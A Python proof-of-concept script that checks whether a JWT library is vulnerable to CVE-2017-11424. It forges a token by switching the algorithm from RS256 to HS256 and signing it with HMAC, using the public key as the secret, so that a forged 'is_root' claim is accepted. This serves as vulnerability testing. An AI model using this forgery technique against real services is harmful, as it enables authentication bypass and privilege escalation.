import jwt
import json
import base64
import time
import hmac
import hashlib

def b64urldecode(b64):
    return base64.urlsafe_b64decode(b64+("="*(len(b64) % 4)))

def b64urlencode(m):
    return base64.urlsafe_b64encode(m).strip(b"=")

print("Testing CVE-2017-11424")

private_key = open("standard.pem","r").read()
public_key = open("standard.pub.pem","r").read()
cve_exp=int(time.time())+86400
cve = jwt.encode({"iss":"joe", "exp":cve_exp, "http://example.com/is_root": True}, private_key, algorithm="RS256")
jwt.decode(cve, public_key, algorithm="RS256")
cve_parts=cve.split(b'.')
print(cve)
cve_msg=b'.'.join(cve_parts[0:2])


alg=b64urldecode(cve_parts[0].decode('utf8'))
alg_tampered=b64urlencode(alg.replace(b"RS256",b"HS256"))
tamper_hmac=b64urlencode(hmac.HMAC(public_key.encode('ascii'),b'.'.join([alg_tampered, cve_parts[1]]),hashlib.sha256).digest())

cve_tampered=b'.'.join([alg_tampered, cve_parts[1], tamper_hmac])
print(cve_tampered)
jwt.decode(cve_tampered, public_key)
print("\nUsing a vulnerable library, good.")
